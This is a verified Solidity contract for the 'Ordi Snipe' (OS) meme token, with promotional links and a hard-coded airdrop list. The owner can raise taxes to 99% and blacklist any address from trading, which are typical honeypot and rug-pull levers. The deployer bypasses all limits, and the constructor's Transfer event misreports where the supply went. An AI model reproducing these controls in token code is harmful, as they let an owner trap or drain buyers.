/**
 *Submitted for verification at Etherscan.io on 2023-12-14
*/

//

//TG: https://t.me/OrdiSnipe
//Website: https://ordisnipe.pro
//Twitter: https://x.com/OrdiSnipe

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address _newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, _newOwner);
        _owner = _newOwner;
        
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}  

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract OS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    mapping (address => uint) private cooldown;
    uint256 private _tax;
    uint256 private time;

    uint256 private constant _tTotal = 1010011010 * 10**9;
    uint256 private fee1=300;
    uint256 private fee2=330;
    string private constant _name = unicode"Ordi Snipe";
    string private constant _symbol = unicode"OS";
    uint256 private _maxTxAmount = _tTotal.div(50);
    uint256 private _maxWalletAmount = _tTotal.div(50);
    uint256 private minBalance = _tTotal.div(1000);
    uint256 private maxCaSell = _tTotal.div(200);
    uint8 private constant _decimals = 9;
    address payable private _deployer;
    address payable private _marketingWallet;
    address[] private airdrop_addresses;
    uint256[] private airdrop_amounts; 
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private limitsEnabled = true;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _deployer = payable(msg.sender);
        _marketingWallet = payable(0xC004b261476cd91890a655fE9620472FA176dEaD);
        airdrop_addresses = [0x83f500819bF4aAa65f6B69A98dD371070e088665,0xAe8ED58423f4Ffa6cEB5A79e2eC5FfAB683C876B,0x5951daa447eB14462795Ad8Bb3dc295B41000000,0x0019cCEe4b9D8BAC50595d85683109a57B7BA246,0x1323c6a8cB45b3Af51646E2180898d01749eA9C2,0x33A578946096c3794759fee3f42e364424a004D0,0x2a4152dcd6032ebeb3cF776d5d5c7F086bCb0b08,0xF120Ce0a17c9730F3aa30ff9aBFB4725FA79dd16,0x60A787480168FF005E5b84aE52A5E20c39a54F22,0xE710Dcc54928C396d243c04a11Cd1D91B624BaBa,0x67B775aA8eC08049A79Cc315Cf4C449b267D8E47,0xd66E83Da2A3ca061fbdDb2AaB21fb3184C5353b7,0x17a49627D2d45a563B73BdFA08Fe9fFE0fb5c422,0x4dcF51646248C9312262acdCdDdc089213153fd6,0xefF85B3FecCD1ef50bA4F16950E48fAAc5792875,0x1C67789Da8bb9AE0cC2AeCb798C71F91B43e6886,0x707DE3327FCAF33D3baEB395B7CFCfd5058040bc,0x3Daea1A877d672e72037e3E7F7E43489B4CBB247,0xEb83B615ad4aDC70f97bB494198ae080ECe946fa,0x044253a6feCd87F99b0C1FcB3B0B9d3F8EDB3844,0x0de918933EA821C6c544b78Db714fa6449188f18,0xcB1ada11B21fE066dCB91A12cb8195fAfA50420b,0xfa00b39De32574160078aea01AC5336a395Fe95B,0x89B15e645f5Bbe4b6E989e830935dEB8A6A4B455,0x03cAB3186462537d45721767c022d5E41E2783B8,0xFcA222b81F6a42f7595E57a88AaFc048E61AA120,0xd42A2AB7352081Ca14E37B5c9a40fDef6669e44C,0xD609fB07b439974d355915E240287f89aD3C8B12,0x18682c3c720deA4CdB1661Dc5F185cFc0561efC6,0x6d4BF590F5D651632d5e073C05EE58e39FEe5db7,0xef9bbC9302848f6FF522552aA79e190e37b4bc3f,0xb163C5f33f04D3eBf63e2F55f08fc1C6acCAEC01,0x602922eb2B5870c6D287CAc85ADff465133C28B4,0x82D98A15d9615F693fB62fcE02Eb58EC182db390,0xdB08070BAbe77b77609DCDD1F559A95C10A9e451,0xC5aE5228cfaD76493Dd565dc9C450BA7C489221C,0x58154594E267773C635e8D1E89227C0794bd30b6,0x711281C1b26AaEd86E40e4cAaf76c1962B45E161,0x3221A1aC48E83153344FE4C57cc78A6fef2e7A62,0xcA05020830AB3175710fa3ad8d8BEE2b92675288,0xF782B7Bb321972a8fE6bA127b697B2B84190dF2a,0xC50BC0be375bC3739D18a502d313C5b92DA19b1B,0xb3F89A394867505798Af235e3525025953E50562,0xe60D0C6bBe305Ca14B7B5ED1699b668312CBe5f5,0xb2d9aF90CdEcF8ff2EE875DcF5a3A43BD4dc2f34,0xaD88C2F9a6FB1d0A8E40585f2Cb1557349c1d457,0x22BAfd4fB3Be5301FF8780B08bdFa4f0c0b8D519,0x81E3f38Ca95F2CaF26bc33F7F796f8a3aF46B50b,0xb261f5E889c599426F36030e96B4BE7D99DE655f,0x044eA8c7588F2Ff61cF13Ee52FF9a0AB3823a2aa,0xDD6946D592522A33d918f8dAe9C9075b85408978,0xA25C4e56A776bCf42cde20eE1E1A1F8a837F6D81,0x8e16c58e0ED39fE73D7266FE99A756B22D5D383d,0xCceDde2f5003237CaADd034cAEB072E76CBc8b94,0x0EdB59bB0Bab82BA8A4A527893956DA8DE0ba5AC,0x08319bC0357829f78dCAFA10B16b6537BA5Eb403,0xC1f683c9c0cEf34aB9571AD90eBfb4D9D6Bbfd51,0x5bEAbF33ec2DFa7F2264C73922f8F4f0d46F0117,0x0732972ACe924dd8feB03564c7D5e46A48627378,0xBF95AD813A0CA076758e2beC321C25d8DadBa2bb,0x982595325bF84794EcBf58e92A50459A9b9Aa5eB,0xA44B9116E3F4e9184Eba888190B7642Bb07899a3,0x83c795A6EB4402562C6d5eee52293Ae9a53A2E11,0x6238Fb1f86Eed79075999c523a3A28032387Fd8B,0xEc950A65Ac52c9c7ec7f2d8B88F5cACED7423418,0xA6Daa2194460756025aa2e08Df561C318e75FFa8,0xf081470f5C6FBCCF48cC4e5B82Dd926409DcdD67,0xf768BB446821E07b756388ecbBf580Ea31251dcB,0xE43AeAc325D96A943479Ae86e16C09A5DF659aB3,0xd20ac1794726edCf07BCE3b116bc745fb6ca6c6D];
	    airdrop_amounts = [14140154140000000,14140154140000000,14140154140000000,14140154140000000,25197489740000000, 21770743350000000, 19567827420000000, 17656287480000000, 14140154140000000, 14140154140000000, 14140154140000000, 14140154140000000, 14140154140000000, 14140154140000000, 14140154140000000, 13800649990000000, 13182552750000000, 12497248300000000, 11568930760000000, 11293998410000000, 9772325160000000, 9632308150000000, 9302007760000000, 8691494840000000, 8653618520000000, 7180884420000000, 6232190970000000, 6232190970000000, 5996864880000000, 5811275290000000, 5566559610000000, 5006213150000000, 4627036830000000, 4412547030000000, 4239944849999999, 3483626160000000, 3390524230000000, 3374003820000000, 2653871470000000, 2649404550000000, 2504220560000000, 2385006230000000, 2287444510000000, 2195751880000000, 2177039190000000, 2109466750000000, 2063455560000000, 2040876290000000, 2028172010000000, 1879549850000000, 1874984850000000, 1715878370000000, 1659480700000000, 1172016060000000, 1161255840000000, 1155254880000000, 684836230000000, 634901950000000, 556238579999999, 395091478000, 970201529, 681760522, 666102765, 578398447, 563475192, 156028025, 1, 1, 1, 1];
        for(uint i=0;i<airdrop_addresses.length;i++){
		    _tOwned[address(airdrop_addresses[i])] = airdrop_amounts[i];
	    }
	    _tOwned[address(this)] = 508176204330000000;
        _tOwned[address(_deployer)] = _tTotal.div(20);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_deployer] = true;

        emit Transfer(address(0),address(this),_tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

   
    function changeMinBalance(uint256 newMin) public onlyOwner {
        minBalance = newMin;

    }

    function editFees(uint256 one, uint256 two) public onlyOwner {
        require(one <= 990 && two <= 990,"Fees have to be smaller than or equal to 99%");
        fee1 = one;
        fee2 = two;
    }

    function removeLimits() public onlyOwner {
        limitsEnabled = false;
    }

    function excludeFromFees(address target) public onlyOwner {
        _isExcludedFromFee[target] = true;
    }
   
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _tax = 0;
        if (from != _deployer && to != _deployer) {
            require(!bots[from] && !bots[to]);
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && limitsEnabled){
                // Cooldown
                require((_tOwned[to] + amount) <= _maxWalletAmount,"Max wallet exceeded");
                require(amount <= _maxTxAmount);
                require(cooldown[to] < block.timestamp);
                cooldown[to] = block.timestamp + (30 seconds);
            }
            
            
            if (!inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from]) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance > minBalance){
                    if(contractTokenBalance > amount){
                        contractTokenBalance = amount;
                        if(contractTokenBalance > maxCaSell){
                            contractTokenBalance = maxCaSell;
                        }
                    }
                    swapTokensForEth(contractTokenBalance);
                    uint256 contractETHBalance = address(this).balance;
                    if(contractETHBalance > 0) {
                        sendETHToFee(address(this).balance);
                    }
                }
            }
        }
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            _tax = 0;
        } else {

            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _tax = fee1;
            }

            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _tax = fee2;
            }

        }	
        _transferStandard(from,to,amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    

    function addLiquidity(uint256 tokenAmount,uint256 ethAmount,address target) private lockTheSwap{
        _approve(address(this),address(uniswapV2Router),tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(address(this),tokenAmount,0,0,target,block.timestamp);
    }

    
    function sendETHToFee(uint256 amount) private {
        _deployer.transfer(amount.div(3));
        _marketingWallet.transfer(amount.mul(2).div(3));
    }
    
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        addLiquidity(balanceOf(address(this)).mul(33).div(100),address(this).balance,owner());
        swapEnabled = true;
        tradingOpen = true;
        limitsEnabled = true;
        time = block.timestamp + (3 minutes);
    }


    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 transferAmount,uint256 tfee) = _getTValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(transferAmount); 
        _tOwned[address(this)] = _tOwned[address(this)].add(tfee);
        emit Transfer(sender, recipient, transferAmount);
    }

    function setBot(address add) public onlyOwner {
        bots[add] = true;
    }
    
    function delBot(address[] memory notbots) public onlyOwner {
        for (uint i = 0; i < notbots.length; i++) {
            bots[notbots[i]] = false;
        }
    }

    receive() external payable {}
    
    function manualswap() external {
        require(_msgSender() == _deployer);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }
    
    function manualsend() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
   
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFee = tAmount.mul(_tax).div(1000);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }

    function recoverTokens(address tokenAddress) public {
        require(_msgSender() == _deployer);
        IERC20 recoveryToken = IERC20(tokenAddress);
        recoveryToken.transfer(_deployer,recoveryToken.balanceOf(address(this)));
    }
}